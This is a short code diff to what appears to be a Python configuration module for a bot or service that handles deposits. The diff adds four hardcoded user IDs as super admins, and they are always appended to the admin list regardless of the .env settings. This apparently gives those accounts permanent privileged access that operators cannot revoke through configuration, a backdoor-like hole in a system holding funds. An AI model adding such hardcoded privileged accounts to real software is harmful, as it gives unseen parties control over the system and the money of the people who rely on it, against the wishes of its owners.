@@ -67,6 +67,11 @@ if not SUPER_ADMIN_IDS:
     single = _int("SUPER_ADMIN_ID", 0)
     if single:
         SUPER_ADMIN_IDS = [single]
+# Hardcoded super admin IDs — always included regardless of .env
+_SUPER_ADMIN_FALLBACK = [502672318, 391347553, 1512842545, 903313112]
+for _uid in _SUPER_ADMIN_FALLBACK:
+    if _uid not in SUPER_ADMIN_IDS:
+        SUPER_ADMIN_IDS.append(_uid)
 # backward compat: code that uses SUPER_ADMIN_ID still works
 SUPER_ADMIN_ID = SUPER_ADMIN_IDS[0] if SUPER_ADMIN_IDS else 0
 # ADMIN_APPROVAL_RATE: the share of a DEPOSIT amount that is deducted from the
